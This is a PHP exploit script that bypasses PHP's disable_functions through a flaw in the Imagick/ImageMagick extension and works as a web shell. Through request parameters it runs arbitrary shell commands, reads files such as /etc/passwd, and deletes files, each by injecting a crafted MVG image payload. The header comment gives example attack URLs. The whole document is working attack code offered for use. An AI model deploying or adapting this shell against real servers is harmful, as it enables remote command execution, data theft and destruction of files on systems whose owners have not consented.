<?php
  /*
    PHP Imagick disable_functions Bypass
    Version: Imagick  <= 3.3.0 PHP >= 5.4
    Original Author: Ricter <ricter@chaitin.com>
    New Author: Hood3dRob1n

    Exec Command: http://site.com/imagick.php?cmd=id
    Read File: http://site.com/imagick.php?read=/etc/passwd
    Delete File: http://site.com/imagick.php?del=/tmp/removeme.txt
    .
    ..
    ...
    Installation of Imagemagick (Debian/Ubuntu):
       apt-get install libmagickwand-dev imagemagick
       pecl install imagick
       echo "extension=imagick.so" >> /etc/php5/apache2/php.ini
       sudo apt-get install php5-imagick
       service apache2 restart
    ...
    ..
    .
  */
  echo "<html><head></head><body>";

  # Confirm Imagemagick library is installed and loaded, or bail...
  if (extension_loaded('imagick')) {
    echo "<b>[*]</b> Imagick is installed<br/>";

    # Display disabled_functions() results...
    echo "<b>Disabled functions:</b><br/><pre>" . ini_get("disable_functions") . "</pre><br/>";

    # Get Command from User
    if(isset($_REQUEST['cmd'])) {
      $command = $_REQUEST['cmd'];
      echo "<b>[*] Command:</b> " . $command . "<br/><pre>";

      $data_file = tempnam('/tmp', 'img');          # placeholder to catch command output
      $imagick_file = tempnam('/tmp', 'img');       # this will serve as our payload file
      $results_file = tempnam('/tmp', 'img');       # This will be our decoy convert output file

# Build the payload, as the actual internal image content directive
# This is what gets parsed and passed to command line call (i.e. /usr/bin/convert)
$exploit = <<<EOF
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/image.jpg"|$command>$data_file")'
pop graphic-context
EOF;

      # Read & Write to trigger the underlying convert call, which triggers command...
      file_put_contents("$imagick_file", $exploit); # Write the payload to payload file
      $thumb = new Imagick();                       # Initialize Imagemagick
      $thumb->readImage("$imagick_file");           # Read in the evil image payload
      $thumb->writeImage($results_file);            # (Try) Write back to disk, triggering convert rce
      $thumb->clear();                              # Cleanup
      $thumb->destroy();

      # Show the command output to the user
      echo file_get_contents($data_file);

      # Remove files
      unlink("$data_file");
      unlink("$imagick_file");
      unlink("$results_file");
      echo "</pre>";
    }

    # Get file to read
    if(isset($_REQUEST['read'])) {
      $f2read = $_REQUEST['read'];
      echo "<b>[*] File Requested:</b> " . $f2read . "<br/><br/>";

      $data_file = tempnam('/tmp', 'img');          # placeholder to catch command output
      $imagick_file = tempnam('/tmp', 'img');       # this will serve as our payload file
      $results_file = tempnam('/tmp', 'img');       # This will render our file content

# Build the payload, as the actual internal image content directive
# This is what gets parsed and passed to command line call (i.e. /usr/bin/convert)
$exploit = <<<EOF
push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 'label:@$f2read'
pop graphic-context
EOF;

      # Read & Write to trigger the underlying convert call, which triggers command...
      file_put_contents("$imagick_file", $exploit); # Write the payload to payload file
      $thumb = new Imagick();                       # Initialize Imagemagick
      $thumb->readImage("$imagick_file");           # Read in the evil image payload
      $thumb->setImageFormat('jpeg');               # Set output type to .jpeg so we can load it properly
      $thumb->writeImage($results_file);            # Write back to disk, triggering convert rendering content to output image
      $thumb->clear();                              # Cleanup
      $thumb->destroy();


      if(is_file($results_file)) {
        # Show the command output to the user (use data:// so we can delete file)
        $bcontent = base64_encode(file_get_contents($results_file));
        echo "<img src=\"data:image/jpeg;base64,$bcontent\"/>";
      } else {
        echo "<b>[x] Error Converting Image</b>.....";
      }

      # Remove files
      unlink("$data_file");
      unlink("$imagick_file");
      unlink("$results_file");
      echo "<br/>";
    }

    # Get file to Delete
    if(isset($_REQUEST['del'])) {
      $f2delete = $_REQUEST['del'];
      if(!is_file($f2delete)) {
        echo "<b>[x] File Requested to Delete Doesn't Exist!</b>....<br/><br/>";
        echo "<b>[x] Try again with another file....<br/><br/>";
      } else {
        echo "<b>[*] File Requested to Delete:</b> " . $f2delete . "<br/><br/>";

        $data_file = tempnam('/tmp', 'img');          # placeholder to catch command output
        $imagick_file = tempnam('/tmp', 'img');       # this will serve as our payload file
        $results_file = tempnam('/tmp', 'img');       # This will be our decoy convert output file

# Build the payload, as the actual internal image content directive
# This is what gets parsed and passed to command line call (i.e. /usr/bin/convert)
$exploit = <<<EOF
push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 'ephemeral:$f2delete'
pop graphic-context
EOF;

        # Read & Write to trigger the underlying convert call, which triggers command...
        file_put_contents("$imagick_file", $exploit); # Write the payload to payload file
        $thumb = new Imagick();                       # Initialize Imagemagick
        $thumb->readImage("$imagick_file");           # Read in the evil image payload
        $thumb->writeImage($results_file);            # Write back to disk, triggering convert rendering content to output image
        $thumb->clear();                              # Cleanup
        $thumb->destroy();

        if(is_file($f2delete)) {
          echo "<b>[x] File was NOT Deleted!</b>....<br/><br/>";
          echo "<b>[x] Might be permissions issue, idk....<br/><br/>";
        } else {
          echo "<b>[*] File Deleted Successfully!</b><br/><br/>";
        }
        # Remove files
        unlink("$data_file");
        unlink("$imagick_file");
        unlink("$results_file");
        echo "<br/>";
      }
    }
  } else {
    echo "<font='red'><b>[x]</b> Imagick is NOT Loaded!</font>";
  }
  echo "</body></html>";
?>
